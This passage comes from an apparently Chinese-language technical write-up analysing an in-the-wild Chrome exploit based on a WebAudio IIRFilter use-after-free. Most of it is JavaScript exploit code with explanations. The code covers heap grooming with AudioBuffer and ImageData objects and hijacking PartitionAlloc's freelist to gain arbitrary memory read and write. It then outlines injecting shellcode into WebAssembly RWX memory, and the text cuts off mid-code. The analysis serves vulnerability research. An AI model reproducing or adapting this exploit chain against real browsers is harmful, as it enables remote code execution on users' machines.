</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Initially we try to allocate the exact size, but if it&#39;s not aligned
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#75715e">// then we&#39;ll have to reallocate and from then on allocate extra.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">unsigned</span> extra_allocation_bytes <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">unsigned</span> total <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>				base<span style="color:#f92672">::</span>CheckAdd(initial_size, extra_allocation_bytes).ValueOrDie();
</span></span><span style="display:flex;"><span>		T<span style="color:#f92672">*</span> allocation <span style="color:#f92672">=</span> <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span>T<span style="color:#f92672">*&gt;</span>(WTF<span style="color:#f92672">::</span>Partitions<span style="color:#f92672">::</span>FastZeroedMalloc(
</span></span><span style="display:flex;"><span>				total, WTF_HEAP_PROFILER_TYPE_NAME(AudioArray<span style="color:#f92672">&lt;</span>T<span style="color:#f92672">&gt;</span>)));
</span></span><span style="display:flex;"><span>		CHECK(allocation);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		T<span style="color:#f92672">*</span> aligned_data <span style="color:#f92672">=</span> AlignedAddress(allocation, kAlignment);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (aligned_data <span style="color:#f92672">==</span> allocation <span style="color:#f92672">||</span> extra_allocation_bytes <span style="color:#f92672">==</span> kAlignment) {
</span></span><span style="display:flex;"><span>			allocation_ <span style="color:#f92672">=</span> allocation;
</span></span><span style="display:flex;"><span>			aligned_data_ <span style="color:#f92672">=</span> aligned_data;
</span></span><span style="display:flex;"><span>			size_ <span style="color:#f92672">=</span> <span style="color:#66d9ef">static_cast</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">&gt;</span>(n);
</span></span><span style="display:flex;"><span>			is_allocation_good <span style="color:#f92672">=</span> true;
</span></span><span style="display:flex;"><span>		} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// always allocate extra after the first alignment failure.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			extra_allocation_bytes <span style="color:#f92672">=</span> kAlignment;
</span></span><span style="display:flex;"><span>			WTF<span style="color:#f92672">::</span>Partitions<span style="color:#f92672">::</span>FastFree(allocation);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>通过 <code>IIRFilter.getFrequencyResponse</code> 函数读取 <code>IIRFilter::feedforwwrd_</code> 存储的数据，运算后写入输出缓冲区。正常情况下 <code>IIRFilter::feedforward_</code> 内容是 0， 运算结果是 π。漏洞利用成功后 <code>IIRFilter::feedforwrd_</code> 的内容被改写成了空闲链表的下一项指针，返回值也一定改变了，所以通过此函数可以判断漏洞是否利用成功。</p>
<p><code>IIRFilter:: feedforward_</code> 使用 0x30 字节的缓冲区， <code>ArrayBufferContents::DataHolder</code> 也占 0x30 字节，把 <code>IIRFilter::feedforward_</code> 插入空闲链表后，再申请 <code>ArrayBufferContents::DataHolder</code>，就可以把 <code>IIRFilter::feedforward_</code> 所在内存块再次申请出来，这样就得到指向同一个内存块的 <code>IIRFilter::feedforward_</code> 和 <code>ArrayBufferContent::DataHolder</code></p>
<hr>
<p><strong>ℹ️NOTE</strong>: <code>IIRFilter::feedforward_</code> 存储两个 double 仅需要 0x10 字节，但由于 <code>AudioArray</code> 的对齐要求，会多申请 0x20 字节，所以实际使用的 0x30 字节的内存块。</p>
<hr>
<ul>
<li>ArrayBufferContents::DataHolder
<ul>
<li>0x00 ref_count_ 引用计数</li>
<li>0x08 data_ 缓冲区，属于 ArrayBufferPartition</li>
<li>0x10 data_length_ 缓冲区长度</li>
<li>0x18 deleter_ 释放函数</li>
<li>0x20 deleter_info_ 释放附加信息</li>
<li>0x28 is_shared_</li>
<li>0x2C has_registerd_external_allocation_</li>
</ul>
</li>
</ul>
<p><code>ArrayBufferContents::DataHolder</code> 被用在 <code>WTF::ArrayBuffer</code> 内部，管理从 PartitionAlloc 申请的内存块。而 <code>WTF::ArrayBuffer</code> 又被 <code>blink::AudioBuffer</code>、<code>blink::ImageData</code> 用做内部数据存储。这样一来，创建 <code>AudioBuffer</code>、<code>ImageData</code>，就相当于创建 <code>ArrayBufferContents::DataHolder</code>。代码 <code>audioBufferArray2.push(audioCtx.createBuffer(1, 1, 10000)); 就是在创建 </code>ArrayBufferContents::DataHolder<code>来占坑刚刚被释放的</code>IIRFilter::feedforward_`。</p>
<h3 id="任意地址读写">任意地址读写</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">finalUAFCallback</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">256</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">floatArray</span>.<span style="color:#a6e22e">fill</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">iirFilters</span>[<span style="color:#a6e22e">i</span>].<span style="color:#a6e22e">getFrequencyResponse</span>(<span style="color:#a6e22e">floatArray</span>, <span style="color:#a6e22e">floatArray</span>, <span style="color:#a6e22e">floatArray</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">floatArray</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">3.1415927410125732</span>) {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">collectGargabe</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">audioBufferArray2</span> <span style="color:#f92672">=</span> [];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">j</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">j</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">80</span>; <span style="color:#a6e22e">j</span><span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">audioBufferArray1</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">sharedAudioCtx</span>.<span style="color:#a6e22e">createBuffer</span>(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">10000</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">iirFilters</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Array(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">collectGargabe</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">j</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">j</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">336</span>; <span style="color:#a6e22e">j</span><span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">imageDataArray</span>.<span style="color:#a6e22e">push</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ImageData</span>(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">imageDataArray</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Array(<span style="color:#ae81ff">10</span>);
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">collectGargabe</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">j</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">j</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">audioBufferArray1</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">j</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">auxArray</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span>
</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">BigUint64Array</span>(<span style="color:#a6e22e">audioBufferArray1</span>[<span style="color:#a6e22e">j</span>].<span style="color:#a6e22e">getChannelData</span>(<span style="color:#ae81ff">0</span>).<span style="color:#a6e22e">buffer</span>);
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">auxArray</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">!=</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0</span>)) {
</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">kickPayload</span>(<span style="color:#a6e22e">auxArray</span>);
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">collectGargabe</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">promise</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Promise(<span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">cb</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">arg</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">400</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">1024</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">60</span>).<span style="color:#a6e22e">buffer</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">cb</span>(<span style="color:#a6e22e">arg</span>);
</span></span><span style="display:flex;"><span>	});
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">promise</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>IIRFilter</code>、<code>ImageData</code>、<code>AudioBuffer</code> 这几个对象，及其内部的一些成员，是由 Oilpan GC 管理的，为了确保它们在特定的时刻被释放，需要主动触发 GC，<code>collectGarbage</code> 函数通过申请多个 <code>ArrayBuffer</code> 占用大量内存来触发 GC。</p>
<p>我们已经构造出使用同一地址的 <code>IIRFilter::feedforward_</code> 和 <code>ArrayBufferContents::DataHolder</code> 两个对象。接下来把 <code>IIRFilter</code> 销毁，再创建另一个 <code>ArrayBufferContents::DataHolder</code> 对象，由于两个对象共用同一块内存，此操作就相当于把前一个 <code>ArrayBufferContents::DataHolder</code> 的内容改写掉了。之后再把第二个 <code>DataHolder</code> 销毁， <code>DataHolder</code> 的第一个 QWORD 的值被改为空闲链表的下一项，但由于这个地方存储的是引用计数 <code>ref_count_</code> ，改写后还是一个合理的引用计数，并不影响 <code>DataHolder</code> 后续使用。而 0x10 处存放的缓冲区 <code>DataHolder::data_</code> 内容不变，但是其所指向的内存已经被释放掉了。这个缓冲区可以通过 <code>ArrayBuffer::getChannelData(0).buffer</code> 访问到，这样我们通过第一个 <code>DataHolder</code> 就可以访问到已经被释放的 <code>DataHolder::data_</code>。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">kickPayload</span>(<span style="color:#a6e22e">auxArray</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">audioCtx</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">OfflineAudioContext</span>(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">3000</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">partitionPagePtr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">getPartitionPageMetadataArea</span>(<span style="color:#a6e22e">byteSwapBigInt</span>(<span style="color:#a6e22e">auxArray</span>[<span style="color:#ae81ff">0</span>]));
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">auxArray</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">byteSwapBigInt</span>(<span style="color:#a6e22e">partitionPagePtr</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>    		<span style="color:#a6e22e">gcPreventer</span>.<span style="color:#a6e22e">push</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">8</span>));
</span></span><span style="display:flex;"><span>    		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">++</span><span style="color:#a6e22e">i</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x100000</span>)
</span></span><span style="display:flex;"><span>        		<span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">auxArray</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">!=</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0</span>));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">freelist</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">BigUint64Array</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">8</span>));
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">gcPreventer</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">freelist</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	...
</span></span></code></pre></div><p>以 <code>audioBufferArray1[j].getChannelData(0).buffer</code> 为缓冲，创建一个 <code>BigUint64Array</code> <code>auxArray</code> 就可以读写这块已经释放的内存。<code>auxArray</code> 开头的 8 字节已经被写入后继空闲块的地址，读出这个地址，计算出本页面元数据的地址，用元数据的地址替换后续空闲块地址，之后申请多个 8 字节的 <code>ArrayBuffer</code>，直到 <code>auxArray</code> 被填充成 0。<code>auxArray</code> 只有到被当做 <code>ArrayBuffer</code> 分配出来时，才会被 <code>ArrayBuffer</code> 的构造函数填 0。这个时候元数据中的 FreeListHead，已经被写入了之前在 <code>auxArray[0]</code> 中存储的值 <code>&amp;FreeListHead</code>，也就是说这个时候 FreeListHead 指向了它本身。之后在申请 8 字节的 <code>ArrayBuffer</code>，就把 FreeListHead 所在内存块当做 <code>ArrayBuffer</code> 分配出，这样一来，修改 <code>freelist[0]</code> 的值，就相当于修改 FreeListHead 的指向。把 <code>freelist[0]</code> 改成任意地址，再申请 8 字节的 <code>ArrayBuffer</code>，就得到了指向这个地址 <code>ArrayBuffer</code>，也就是得到了任意地址读写的能力。另外由于 FreeListHead 已经被我们“挪用”了，为了保证利用代码的稳定，申请到的 8 字节对象都不能再被释放了，需要加入到 gcPreventer 数组中防止 GC 回收。</p>
<hr>
<p><strong>ℹ️NOTE</strong>*: 卡巴斯基的分析中提到，这部分代码还有整理碎片内存，提升漏洞利用稳定性的作用，水平所限我还不能理解这部分功能，这里先忽略了。</p>
<hr>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">rwHelper</span>, <span style="color:#a6e22e">addr</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">rwHelper</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">addr</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">tmp</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">BigUint64Array</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">tmp</span>.<span style="color:#a6e22e">buffer</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">gcPreventer</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">tmp</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">byteSwapBigInt</span>(<span style="color:#a6e22e">rwHelper</span>[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">write64</span>(<span style="color:#a6e22e">rwHelper</span>, <span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">value</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">rwHelper</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">addr</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">tmp</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">BigUint64Array</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">tmp</span>.<span style="color:#a6e22e">buffer</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">tmp</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">value</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">gcPreventer</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">tmp</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>freeList</code> 配合上这两个函数，就可以实现任意内存读写了。<code>read64</code> 把目标地址填入链表头，之后申请内存，就相当于读取链表头地址的前 8 字节，交换大小端后存入链表头。<code>write64</code> 把目标地址存入链表头，之后申请内存，申请到的内存块就指向之前填入的地址，写入此内存块就是写入目标地址。</p>
<h4 id="执行-shellcode">执行 shellcode</h4>
<p>接下来执行 shellcode：</p>
<ul>
<li>实例化 WASM 模块构造一段 RWX 内存区域，将导出函数 main 赋值到 wasmFuncA</li>
<li>预测 fileReaderLoader 的地址</li>
<li>创建 fileReader，将 fileReader.onerror 设置为 wasmFuncA</li>
<li>用 fileReaderLoader 计算出 fileReader 的地址，再从 fileReader 的事件处理中读取到 wasmFuncA ，最终读取到 RWX 内存区的地址</li>
<li>预测 <code>WTF::ArrayBuffer</code> 的地址，之后创建 <code>AudioBuffer</code></li>
<li>根据预测的 <code>ArrayBuffer</code> 的地址，改写 <code>ArrayBuffer</code> 指向到 RWX 内存区域</li>
<li>把 shellcode 写入 <code>ArrayBuffer</code></li>
<li>调用 wasmFuncA，触发 shellcode 执行</li>
</ul>
<p>获取 filereaderLoader 对象地址的方法需要额外说明下，前面介绍过每个 Partition 都有一组桶，用来查找包含指定大小内存块的 PartitionPage，如果可以读到这个桶中当前存放的数据，就可以预测到下次内存分配的结果，<code>getPartitionPageFreeListHeadEntryBySlotSize</code> 就是按照这个思路实现的，PartitionPage 的元数据中存放了指向桶的指针，已知 <code>iirFilterFeedforwardAllocationPtr</code> 指向 0x30 字节的内存块，可以利用它的值读到 0x30 的桶，所有的桶共都存储在同一个数组中，有了 0x30 的桶，我们加上固定的偏移，就可以得到其他大小的桶。从桶中读出活动页面 PartitionPage 元数据的指针，再从元数据中读出下一个空闲内存块的地址。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">kickPayload</span>(<span style="color:#a6e22e">auxArray</span>) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 接上部分
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">wasmBuffer</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>([<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">115</span>, <span style="color:#ae81ff">109</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">133</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">96</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">127</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">130</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">132</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">112</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">131</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">129</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">145</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">109</span>, <span style="color:#ae81ff">101</span>, <span style="color:#ae81ff">109</span>, <span style="color:#ae81ff">111</span>, <span style="color:#ae81ff">114</span>, <span style="color:#ae81ff">121</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">109</span>, <span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">105</span>, <span style="color:#ae81ff">110</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">138</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">132</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">65</span>, <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">11</span>]);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">wasmBlob</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Blob</span>([<span style="color:#a6e22e">wasmBuffer</span>], {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;application/wasm&#34;</span>
</span></span><span style="display:flex;"><span>	});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">wasmUrl</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">URL</span>.<span style="color:#a6e22e">createObjectURL</span>(<span style="color:#a6e22e">wasmBlob</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasmFuncA</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">undefined</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">WebAssembly</span>.<span style="color:#a6e22e">instantiateStreaming</span>(<span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">wasmUrl</span>), {})
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">wasmFuncA</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">instance</span>.<span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">main</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 预测 fileReaderLoader 地址
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">fileReader</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">FileReader</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">fileReaderLoaderSize</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x140</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">fileReaderLoaderPtr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">getPartitionPageFreeListHeadEntryBySlotSize</span>(<span style="color:#a6e22e">freelist</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">iirFilterFeedforwardAllocationPtr</span>, <span style="color:#a6e22e">fileReaderLoaderSize</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">fileReaderLoaderPtr</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fileReader</span>.<span style="color:#a6e22e">readAsArrayBuffer</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Blob</span>([]));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">fileReaderLoaderTestPtr</span> <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">getPartitionPageFreeListHeadEntryBySlotSize</span>(<span style="color:#a6e22e">freelist</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">iirFilterFeedforwardAllocationPtr</span>, <span style="color:#a6e22e">fileReaderLoaderSize</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">fileReaderLoaderPtr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">fileReaderLoaderTestPtr</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>;
